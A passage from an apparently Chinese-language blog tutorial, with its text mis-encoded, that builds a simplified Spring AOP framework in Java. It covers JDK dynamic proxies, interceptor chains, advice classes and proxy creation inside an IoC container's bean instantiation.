&#125;&#125;</code></pre></div></li><li><p>AopProxyï¼Œä»£ç†å·¥å‚çš„é¡¶å±‚æ¥å£ï¼Œä¸»è¦æ˜¯CglibAopProxyå’ŒJdkDynamicAopProxyè¿™äºŒä¸ªå­ç±»åˆ†åˆ«å®ç°CGlibå’ŒJDK Proxyçš„ä»£ç†</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.spring.framework.aop;<span class="hljs-comment">/**</span><span class="hljs-comment"> * ä»£ç†å·¥å‚çš„é¡¶å±‚æ¥å£ï¼Œæä¾›è·å–ä»£ç†å¯¹è±¡çš„é¡¶å±‚å…¥å£</span><span class="hljs-comment"> * é»˜è®¤å°±ä½¿ç”¨JDKçš„åŠ¨æ€ä»£ç†</span><span class="hljs-comment"> */</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">MyAopProxy</span> &#123;    <span class="hljs-comment">//è·å–ä¸€ä¸ªä»£ç†å¯¹è±¡</span>    Object <span class="hljs-title function_">getProxy</span><span class="hljs-params">()</span>;    <span class="hljs-comment">//é€šè¿‡è‡ªå®šä¹‰ç±»åŠ è½½å™¨è·å¾—ä¸€ä¸ªä»£ç†å¯¹è±¡</span>    Object <span class="hljs-title function_">getProxy</span><span class="hljs-params">(ClassLoader classLoader)</span>;&#125;</code></pre></div></li><li><p>CGlibAopProxyï¼Œæš‚ä¸åšå®ç°</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.spring.framework.aop;<span class="hljs-keyword">import</span> com.czh.spring.framework.aop.support.MyAdvisedSupport;<span class="hljs-comment">/**</span><span class="hljs-comment"> * TODO ä½¿ç”¨CGlibç”Ÿæˆä»£ç†ç±»</span><span class="hljs-comment"> */</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyCglibAopProxy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">MyAopProxy</span>&#123;    <span class="hljs-keyword">private</span> MyAdvisedSupport config;        <span class="hljs-keyword">public</span> <span class="hljs-title function_">MyCglibAopProxy</span><span class="hljs-params">(MyAdvisedSupport advisedSupport)</span>&#123;        <span class="hljs-built_in">this</span>.config = advisedSupport;    &#125;        <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getProxy</span><span class="hljs-params">()</span> &#123;        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getProxy</span><span class="hljs-params">(ClassLoader classLoader)</span> &#123;        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;    &#125;&#125;</code></pre></div></li><li><p>JdkDynamicAopProxyï¼Œä¸»è¦åŠŸèƒ½åœ¨invoke()æ–¹æ³•ä¸­ã€‚ä¸»è¦æ˜¯è°ƒç”¨AdvisedSupportçš„getInterceptorAndDynamicInterceptionAdvice()æ–¹æ³•è·å¾—æ‹¦æˆªå™¨é“¾ã€‚åœ¨ç›®æ ‡ç±»ä¸­ï¼Œæ¯ä¸€ä¸ªè¢«å¢å¼ºçš„ç›®æ ‡æ–¹æ³•éƒ½å¯¹åº”ä¸€ä¸ªæ‹¦æˆªå™¨é“¾ã€‚</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.spring.framework.aop;<span class="hljs-keyword">import</span> com.czh.spring.framework.aop.support.MyAdvisedSupport;<span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<span class="hljs-keyword">import</span> java.lang.reflect.Method;<span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<span class="hljs-keyword">import</span> java.util.List;<span class="hljs-comment">/**</span><span class="hljs-comment"> * ä½¿ç”¨JDK Proxy APIæ¥ç”Ÿæˆä»£ç†ç±»</span><span class="hljs-comment"> */</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyJdkDynamicAopProxy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">MyAopProxy</span>, InvocationHandler &#123;    <span class="hljs-keyword">private</span> MyAdvisedSupport config;    <span class="hljs-keyword">public</span> <span class="hljs-title function_">MyJdkDynamicAopProxy</span><span class="hljs-params">(MyAdvisedSupport config)</span> &#123;        <span class="hljs-built_in">this</span>.config = config;    &#125;    <span class="hljs-comment">//ä¼ å…¥åŸç”Ÿå¯¹è±¡</span>    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getProxy</span><span class="hljs-params">()</span> &#123;        <span class="hljs-keyword">return</span> getProxy(<span class="hljs-built_in">this</span>.config.getTargetClass().getClassLoader());    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getProxy</span><span class="hljs-params">(ClassLoader classLoader)</span> &#123;        <span class="hljs-keyword">return</span> Proxy.newProxyInstance(classLoader,<span class="hljs-built_in">this</span>.config.getTargetClass().getInterfaces(),<span class="hljs-built_in">this</span>);    &#125;    <span class="hljs-comment">//invoke()æ–¹æ³•æ˜¯æ‰§è¡Œä»£ç†çš„å…³é”®å…¥å£</span>    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable &#123;        <span class="hljs-comment">//å°†æ¯ä¸€ä¸ªJoinPointä¹Ÿå°±æ˜¯è¢«ä»£ç†çš„ä¸šåŠ¡æ–¹æ³•ï¼ˆMethodï¼‰å°è£…æˆä¸€ä¸ªæ‹¦æˆªå™¨ï¼Œç»„åˆæˆä¸€ä¸ªæ‹¦æˆªå™¨é“¾</span>        List&lt;Object&gt; interceptorAndDynamicMethodMatchers =                 config.getInterceptorAndDynamicInterceptionAdvice(method, <span class="hljs-built_in">this</span>.config.getTargetClass());        <span class="hljs-comment">//äº¤ç»™æ‹¦æˆªå™¨é“¾MethodInvocationçš„proceed()æ–¹æ³•æ‰§è¡Œ</span>        <span class="hljs-type">MyMethodInvocation</span> <span class="hljs-variable">invocation</span> <span class="hljs-operator">=</span>                 <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyMethodInvocation</span>(proxy, <span class="hljs-built_in">this</span>.config.getTarget(), method, args, <span class="hljs-built_in">this</span>.config.getTargetClass(), interceptorAndDynamicMethodMatchers);        <span class="hljs-keyword">return</span> invocation.proceed();    &#125;&#125;</code></pre></div></li><li><p>MethodInvocationï¼šå…³é”®æ–¹æ³•æ˜¯proceed()ï¼Œå…ˆè¿›è¡Œåˆ¤æ–­ï¼Œå¦‚æœæ‹¦æˆªå™¨ä¸ºç©ºï¼Œåˆ™è¯´æ˜ç›®æ ‡æ–¹æ³•æ— éœ€å¢å¼ºï¼Œç›´æ¥è°ƒç”¨ç›®æ ‡æ–¹æ³•å¹¶è¿”å›ã€‚å¦‚æœæ‹¦æˆªå™¨é“¾ä¸ä¸ºç©ºï¼Œåˆ™å°†æ‹¦æˆªå™¨é“¾ä¸­çš„æ–¹æ³•æŒ‰é¡ºåºæ‰§è¡Œï¼Œç›´åˆ°æ‹¦æˆªå™¨é“¾ä¸­æ‰€æœ‰æ–¹æ³•å…¨éƒ¨æ‰§è¡Œå®Œæ¯•ã€‚</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.spring.framework.aop.intercept;<span class="hljs-keyword">import</span> com.czh.spring.framework.aop.aspect.MyJoinPoint;<span class="hljs-keyword">import</span> java.lang.reflect.Method;<span class="hljs-keyword">import</span> java.util.HashMap;<span class="hljs-keyword">import</span> java.util.List;<span class="hljs-keyword">import</span> java.util.Map;<span class="hljs-comment">/**</span><span class="hljs-comment"> * æ‰§è¡Œæ‹¦æˆªå™¨é“¾ï¼Œç›¸å½“äºSpringä¸­ReflectiveMethodInvocationçš„åŠŸèƒ½</span><span class="hljs-comment"> */</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyMethodInvocation</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">MyJoinPoint</span> &#123;        <span class="hljs-keyword">private</span> Object proxy;<span class="hljs-comment">//ä»£ç†å¯¹è±¡</span>    <span class="hljs-keyword">private</span> Method method;<span class="hljs-comment">//ä»£ç†çš„ç›®æ ‡æ–¹æ³•</span>    <span class="hljs-keyword">private</span> Object target;<span class="hljs-comment">//ä»£ç†çš„ç›®æ ‡å¯¹è±¡</span>    <span class="hljs-keyword">private</span> Class&lt;?&gt; targetClass;<span class="hljs-comment">//ä»£ç†çš„ç›®æ ‡ç±»</span>    <span class="hljs-keyword">private</span> Object[] arguments;<span class="hljs-comment">//ä»£ç†çš„æ–¹æ³•çš„å®å‚åˆ—è¡¨</span>    <span class="hljs-keyword">private</span> List&lt;Object&gt; interceptorsAndDynamicMethodMatchers;<span class="hljs-comment">//å›è°ƒæ–¹æ³•é“¾</span>        <span class="hljs-comment">//ä¿å­˜è‡ªå®šä¹‰å±æ€§</span>    <span class="hljs-keyword">private</span> Map&lt;String,Object&gt; userAttributes;        <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">currentInterceptorIndex</span> <span class="hljs-operator">=</span> -<span class="hljs-number">1</span>;    <span class="hljs-keyword">public</span> <span class="hljs-title function_">MyMethodInvocation</span><span class="hljs-params">(Object proxy, Object target, Method method, Object[] arguments,Class&lt;?&gt; targetClass, List&lt;Object&gt; interceptorsAndDynamicMethodMatchers)</span> &#123;        <span class="hljs-built_in">this</span>.proxy = proxy;        <span class="hljs-built_in">this</span>.method = method;        <span class="hljs-built_in">this</span>.target = target;        <span class="hljs-built_in">this</span>.targetClass = targetClass;        <span class="hljs-built_in">this</span>.arguments = arguments;        <span class="hljs-built_in">this</span>.interceptorsAndDynamicMethodMatchers = interceptorsAndDynamicMethodMatchers;    &#125;    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">proceed</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Throwable &#123;        <span class="hljs-comment">//å¦‚æœInterceptoræ‰§è¡Œå®Œäº†ï¼Œåˆ™æ‰§è¡ŒjoinPoint</span>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">this</span>.currentInterceptorIndex == <span class="hljs-built_in">this</span>.interceptorsAndDynamicMethodMatchers.size()-<span class="hljs-number">1</span>)&#123;            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.method.invoke(<span class="hljs-built_in">this</span>.target,<span class="hljs-built_in">this</span>.arguments);        &#125;        <span class="hljs-type">Object</span> <span class="hljs-variable">interceptorOrInterceptionAdvice</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.interceptorsAndDynamicMethodMatchers.get(++<span class="hljs-built_in">this</span>.currentInterceptorIndex);        <span class="hljs-comment">//å¦‚æœè¦åŠ¨æ€åŒ¹é…joinPoint</span>        <span class="hljs-keyword">if</span>(interceptorOrInterceptionAdvice <span class="hljs-keyword">instanceof</span> MyMethodInterceptor)&#123;            <span class="hljs-type">MyMethodInterceptor</span> <span class="hljs-variable">mi</span> <span class="hljs-operator">=</span> (MyMethodInterceptor)interceptorOrInterceptionAdvice;            <span class="hljs-keyword">return</span> mi.invoke(<span class="hljs-built_in">this</span>);        &#125; <span class="hljs-keyword">else</span> &#123;            <span class="hljs-comment">//æ‰§è¡Œå½“å‰Interceptor</span>            <span class="hljs-keyword">return</span> proceed();        &#125;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> Method <span class="hljs-title function_">getMethod</span><span class="hljs-params">()</span> &#123;        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.method;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> Object[] getArguments() &#123;        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.arguments;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getThis</span><span class="hljs-params">()</span> &#123;        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.target;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setUserAttribute</span><span class="hljs-params">(String key, Object value)</span> &#123;        <span class="hljs-keyword">if</span>(<span class="hljs-literal">null</span> != value)&#123;            <span class="hljs-keyword">if</span>(<span class="hljs-literal">null</span> == <span class="hljs-built_in">this</span>.userAttributes)&#123;                <span class="hljs-built_in">this</span>.userAttributes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;String,Object&gt;();            &#125;            <span class="hljs-built_in">this</span>.userAttributes.put(key, value);        &#125;<span class="hljs-keyword">else</span> &#123;            <span class="hljs-keyword">if</span>(<span class="hljs-literal">null</span> != <span class="hljs-built_in">this</span>.userAttributes)&#123;                <span class="hljs-built_in">this</span>.userAttributes.remove(key);            &#125;        &#125;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getUserAttribute</span><span class="hljs-params">(String key)</span> &#123;        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">this</span>.userAttributes != <span class="hljs-literal">null</span> ? <span class="hljs-built_in">this</span>.userAttributes.get(key):<span class="hljs-literal">null</span>);    &#125;&#125;</code></pre></div></li></ul><h2 id="è®¾è®¡AOPåŸºç¡€å®ç°"><a href="#è®¾è®¡AOPåŸºç¡€å®ç°" class="headerlink" title="è®¾è®¡AOPåŸºç¡€å®ç°"></a>è®¾è®¡AOPåŸºç¡€å®ç°</h2><ul><li><p>Adviceä½œä¸ºæ‰€æœ‰å›è°ƒé€šçŸ¥çš„é¡¶å±‚æ¥å£è®¾è®¡ï¼Œæš‚æ—¶åªæ˜¯ä½œä¸ºè§„èŒƒï¼Œæ²¡å®ç°ä»»ä½•åŠŸèƒ½ã€‚</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.spring.framework.aop.aspect;<span class="hljs-comment">/**</span><span class="hljs-comment"> * å›è°ƒé€šçŸ¥é¡¶å±‚æ¥å£</span><span class="hljs-comment"> */</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">MyAdvice</span> &#123;&#125;</code></pre></div></li><li><p>AbstractAspectJAdviceï¼šä½¿ç”¨æ¨¡ç‰ˆè®¾è®¡MyAbstractAspectJAdviceç±»ï¼Œå°è£…æ‹¦æˆªå™¨å›è°ƒçš„é€šç”¨é€»è¾‘ï¼Œä¸»è¦å°è£…åå°„åŠ¨æ€è°ƒç”¨æ–¹æ³•ï¼Œå…¶å­ç±»åªéœ€è¦æ§åˆ¶è°ƒç”¨é¡ºåºå³å¯ã€‚</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.spring.framework.aop.aspect;<span class="hljs-keyword">import</span> java.lang.reflect.Method;<span class="hljs-comment">/**</span><span class="hljs-comment"> * å°è£…æ‹¦æˆªå™¨å›è°ƒçš„é€šç”¨é€»è¾‘ï¼Œä¸»è¦å°è£…äº†åå°„åŠ¨æ€è°ƒç”¨æ–¹æ³•</span><span class="hljs-comment"> */</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyAbstractAspectJAdvice</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">MyAdvice</span>&#123;    <span class="hljs-keyword">private</span> Method aspectMethod;    <span class="hljs-keyword">private</span> Object aspectTarget;    <span class="hljs-keyword">public</span> <span class="hljs-title function_">MyAbstractAspectJAdvice</span><span class="hljs-params">(Method aspectMethod, Object aspectTarget)</span> &#123;        <span class="hljs-built_in">this</span>.aspectMethod = aspectMethod;        <span class="hljs-built_in">this</span>.aspectTarget = aspectTarget;    &#125;        <span class="hljs-comment">//åå°„åŠ¨æ€è°ƒç”¨æ–¹æ³•</span>    <span class="hljs-keyword">protected</span> Object <span class="hljs-title function_">invokeAdviceMethod</span><span class="hljs-params">(MyJoinPoint joinPoint,Object returnValue,Throwable ex)</span><span class="hljs-keyword">throws</span> Throwable&#123;        Class&lt;?&gt;[] paramsTypes = <span class="hljs-built_in">this</span>.aspectMethod.getParameterTypes();        <span class="hljs-keyword">if</span>(<span class="hljs-literal">null</span> == paramsTypes || paramsTypes.length == <span class="hljs-number">0</span>)&#123;            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.aspectMethod.invoke(aspectTarget);        &#125; <span class="hljs-keyword">else</span> &#123;            Object[] args = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[paramsTypes.length];            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; paramsTypes.length; i++) &#123;                <span class="hljs-keyword">if</span>(paramsTypes[i] == MyJoinPoint.class)&#123;                    args[i] = joinPoint;                &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(paramsTypes[i] == Throwable.class)&#123;                    args[i] = ex;                &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(paramsTypes[i] == Object.class)&#123;                    args[i] = returnValue;                &#125;            &#125;            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.aspectMethod.invoke(aspectTarget,args);        &#125;    &#125;&#125;</code></pre></div></li><li><p>MethodBeforeAdviceï¼šç»§æ‰¿è‡ªAbstractAspectJAdivceï¼Œå®ç°Adviceå’ŒMethodInterceptoræ¥å£ï¼Œåœ¨invoke()ä¸­æ§åˆ¶å‰ç½®é€šçŸ¥çš„è°ƒç”¨é¡ºåº</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.spring.framework.aop.aspect;<span class="hljs-keyword">import</span> com.czh.spring.framework.aop.intercept.MyMethodInterceptor;<span class="hljs-keyword">import</span> com.czh.spring.framework.aop.intercept.MyMethodInvocation;<span class="hljs-keyword">import</span> java.lang.reflect.Method;<span class="hljs-comment">/**</span><span class="hljs-comment"> * å‰ç½®é€šçŸ¥å…·ä½“å®ç°</span><span class="hljs-comment"> */</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyMethodBeforeAdvice</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">MyAbstractAspectJAdvice</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">MyAdvice</span>, MyMethodInterceptor &#123;    <span class="hljs-keyword">private</span> MyJoinPoint joinPoint;    <span class="hljs-keyword">public</span> <span class="hljs-title function_">MyMethodBeforeAdvice</span><span class="hljs-params">(Method aspectMethod, Object aspectTarget)</span> &#123;        <span class="hljs-built_in">super</span>(aspectMethod, aspectTarget);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">before</span><span class="hljs-params">(Method method,Object[] args,Object target)</span><span class="hljs-keyword">throws</span> Throwable&#123;        invokeAdviceMethod(<span class="hljs-built_in">this</span>.joinPoint,<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>);    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(MyMethodInvocation mi)</span> <span class="hljs-keyword">throws</span> Throwable &#123;        <span class="hljs-built_in">this</span>.joinPoint = mi;        <span class="hljs-built_in">this</span>.before(mi.getMethod(), mi.getArguments(), mi.getThis());        <span class="hljs-keyword">return</span> mi.proceed();    &#125;&#125;</code></pre></div></li><li><p>AfterReturningAdviceï¼šç»§æ‰¿è‡ªAbstractAspectJAdivceï¼Œå®ç°Adviceå’ŒMethodInterceptoræ¥å£ï¼Œåœ¨invoke()ä¸­æ§åˆ¶åç½®é€šçŸ¥çš„è°ƒç”¨é¡ºåº</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.spring.framework.aop.aspect;<span class="hljs-keyword">import</span> com.czh.spring.framework.aop.intercept.MyMethodInterceptor;<span class="hljs-keyword">import</span> com.czh.spring.framework.aop.intercept.MyMethodInvocation;<span class="hljs-keyword">import</span> java.lang.reflect.Method;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyAfterReturningAdvice</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">MyAbstractAspectJAdvice</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">MyAdvice</span>, MyMethodInterceptor&#123;        <span class="hljs-keyword">private</span> MyJoinPoint joinPoint;        <span class="hljs-keyword">public</span> <span class="hljs-title function_">MyAfterReturningAdvice</span><span class="hljs-params">(Method aspectMethod, Object aspectTarget)</span> &#123;        <span class="hljs-built_in">super</span>(aspectMethod, aspectTarget);    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(MyMethodInvocation mi)</span> <span class="hljs-keyword">throws</span> Throwable &#123;        <span class="hljs-type">Object</span> <span class="hljs-variable">retVal</span> <span class="hljs-operator">=</span> mi.proceed();        <span class="hljs-built_in">this</span>.joinPoint = mi;        <span class="hljs-built_in">this</span>.afterReturning(retVal,mi.getMethod(),mi.getArguments(),mi.getThis());        <span class="hljs-keyword">return</span> retVal;    &#125;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterReturning</span><span class="hljs-params">(Object retVal, Method method, Object[] arguments, Object aThis)</span> <span class="hljs-keyword">throws</span> Throwable &#123;        invokeAdviceMethod(joinPoint,retVal,<span class="hljs-literal">null</span>);    &#125;&#125;</code></pre></div></li><li><p>AfterThrowingAdviceï¼šç»§æ‰¿è‡ªAbstractAspectJAdivceï¼Œå®ç°Adviceå’ŒMethodInterceptoræ¥å£ï¼Œåœ¨invoke()ä¸­æ§åˆ¶å¼‚å¸¸é€šçŸ¥çš„è°ƒç”¨é¡ºåº</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.spring.framework.aop.aspect;<span class="hljs-keyword">import</span> com.czh.spring.framework.aop.intercept.MyMethodInterceptor;<span class="hljs-keyword">import</span> com.czh.spring.framework.aop.intercept.MyMethodInvocation;<span class="hljs-keyword">import</span> java.lang.reflect.Method;<span class="hljs-comment">/**</span><span class="hljs-comment"> * å¼‚å¸¸é€šçŸ¥çš„å…·ä½“å®ç°</span><span class="hljs-comment"> */</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyAfterThrowingAdvice</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">MyAbstractAspectJAdvice</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">MyAdvice</span>, MyMethodInterceptor &#123;        <span class="hljs-keyword">private</span> String throwingName;    <span class="hljs-keyword">private</span> MyMethodInvocation mi;        <span class="hljs-keyword">public</span> <span class="hljs-title function_">MyAfterThrowingAdvice</span><span class="hljs-params">(Method aspectMethod, Object aspectTarget)</span> &#123;        <span class="hljs-built_in">super</span>(aspectMethod, aspectTarget);    &#125;        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setThrowingName</span><span class="hljs-params">(String aspectAfterThrowingName)</span> &#123;        <span class="hljs-built_in">this</span>.throwingName = aspectAfterThrowingName;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(MyMethodInvocation mi)</span> <span class="hljs-keyword">throws</span> Throwable &#123;        <span class="hljs-keyword">try</span> &#123;            <span class="hljs-keyword">return</span> mi.proceed();        &#125;<span class="hljs-keyword">catch</span> (Throwable ex)&#123;            invokeAdviceMethod(mi,<span class="hljs-literal">null</span>,ex.getCause());            <span class="hljs-keyword">throw</span> ex;        &#125;    &#125;&#125;</code></pre></div></li></ul><h2 id="æ¥å…¥getBeanæ–¹æ³•"><a href="#æ¥å…¥getBeanæ–¹æ³•" class="headerlink" title="æ¥å…¥getBeanæ–¹æ³•"></a>æ¥å…¥getBeanæ–¹æ³•</h2><ul><li><p>å¦‚ä½•é›†æˆåˆ°IoCå®¹å™¨ä¸­å»ï¼Ÿåœ¨MyApplicationContextä¸­çš„instantiateBean()æ–¹æ³•ï¼Œåœ¨åˆå§‹åŒ–æ—¶å°±å¯ä»¥ç¡®å®šæ˜¯å¦è¿”å›åŸç”ŸBeanæˆ–è€…ProxyBeanã€‚</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">private</span> Object <span class="hljs-title function_">instantiateBean</span><span class="hljs-params">(MyBeanDefinition beanDefinition)</span> &#123;    <span class="hljs-type">Object</span> <span class="hljs-variable">instance</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;    <span class="hljs-type">String</span> <span class="hljs-variable">beanClassName</span> <span class="hljs-operator">=</span> beanDefinition.getBeanClassName();      <span class="hljs-keyword">try</span> &#123;        <span class="hljs-comment">//å› ä¸ºæ ¹æ®Classæ‰èƒ½ç¡®å®šä¸€ä¸ªç±»æ˜¯å¦æœ‰å®ä¾‹</span>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">this</span>.factoryBeanObjectCache.containsKey(beanClassName))&#123;            instance = <span class="hljs-built_in">this</span>.factoryBeanObjectCache.get(beanClassName);        &#125;<span class="hljs-keyword">else</span> &#123;            Class&lt;?&gt; clazz = Class.forName(beanClassName);            instance = clazz.newInstance();                        <span class="hljs-type">MyAdvisedSupport</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> instantionAopConfig(beanDefinition);            config.setTargetClass(clazz);            config.setTarget(instance);                        <span class="hljs-keyword">if</span>(config.pointCutMatch())&#123;                instance = createProxy(config).getProxy();            &#125;            <span class="hljs-built_in">this</span>.factoryBeanObjectCache.put(beanClassName,instance);            <span class="hljs-built_in">this</span>.factoryBeanObjectCache.put(beanDefinition.getFactoryBeanName(),instance);        &#125;        <span class="hljs-keyword">return</span> instance;    &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;        e.printStackTrace();    &#125; <span class="hljs-keyword">catch</span> (InstantiationException e) &#123;        e.printStackTrace();    &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;        e.printStackTrace();    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;&#125;  <span class="hljs-keyword">private</span> MyAdvisedSupport <span class="hljs-title function_">instantionAopConfig</span><span class="hljs-params">(MyBeanDefinition beanDefinition)</span> &#123;    <span class="hljs-type">MyAopConfig</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyAopConfig</span>();    config.setPointCut(reader.getConfig().getProperty(<span class="hljs-string">&quot;pointCut&quot;</span>));    config.setAspectClass(reader.getConfig().getProperty(<span class="hljs-string">&quot;aspectClass&quot;</span>));    config.setAspectBefore(reader.getConfig().getProperty(<span class="hljs-string">&quot;aspectBefore&quot;</span>));    config.setAspectAfter(reader.getConfig().getProperty(<span class="hljs-string">&quot;aspectAfter&quot;</span>));    config.setAspectAfterThrow(reader.getConfig().getProperty(<span class="hljs-string">&quot;aspectAfterThrow&quot;</span>));    config.setAspectAfterThrowingName(reader.getConfig().getProperty(<span class="hljs-string">&quot;aspectAfterThrowingName&quot;</span>));        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyAdvisedSupport</span>(config);&#125;<span class="hljs-keyword">private</span> MyAopProxy <span class="hljs-title function_">createProxy</span><span class="hljs-params">(MyAdvisedSupport config)</span>&#123;    <span class="hljs-type">Class</span> <span class="hljs-variable">targetClass</span> <span class="hljs-operator">=</span> config.getTargetClass();    <span class="hljs-keyword">if</span>(targetClass.getInterfaces().length&gt;<span class="hljs-number">0</span>)&#123;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyJdkDynamicAopProxy</span>(config);    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyCglibAopProxy</span>(config);&#125;</code></pre></div></li></ul><h2 id="ç»‡å…¥ä¸šåŠ¡ä»£ç "><a href="#ç»‡å…¥ä¸šåŠ¡ä»£ç " class="headerlink" title="ç»‡å…¥ä¸šåŠ¡ä»£ç "></a>ç»‡å…¥ä¸šåŠ¡ä»£ç </h2><ul><li><p>åˆ›å»ºLogAspectç±»ï¼Œå®ç°å¯¹ä¸šåŠ¡æ–¹æ³•çš„ç›‘æ§ã€‚ä¸»è¦æ˜¯è®°å½•ç›®æ ‡æ–¹æ³•çš„è°ƒç”¨æ—¥å¿—ï¼Œè·å–ç›®æ ‡æ–¹æ³•åã€å®å‚åˆ—è¡¨ã€æ¯æ¬¡è°ƒç”¨æ‰€æ¶ˆè€—çš„æ—¶é—´</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.spring.demo.aspect;<span class="hljs-keyword">import</span> com.czh.spring.framework.aop.aspect.MyJoinPoint;<span class="hljs-keyword">import</span> lombok.extern.slf4j.Slf4j;<span class="hljs-keyword">import</span> java.util.Arrays;<span class="hljs-comment">/**</span><span class="hljs-comment"> * å®šä¹‰ä¸€ä¸ªç»‡å…¥çš„åˆ‡é¢é€»è¾‘ï¼Œä¹Ÿå°±æ˜¯è¦é’ˆå¯¹ç›®æ ‡ä»£ç†å¯¹è±¡å¢å¼ºçš„é€»è¾‘</span><span class="hljs-comment"> * æœ¬ç±»ä¸»è¦å®Œæˆå¯¹æ–¹æ³•è°ƒç”¨çš„ç›‘æ§ï¼Œç›‘å¬ç›®æ 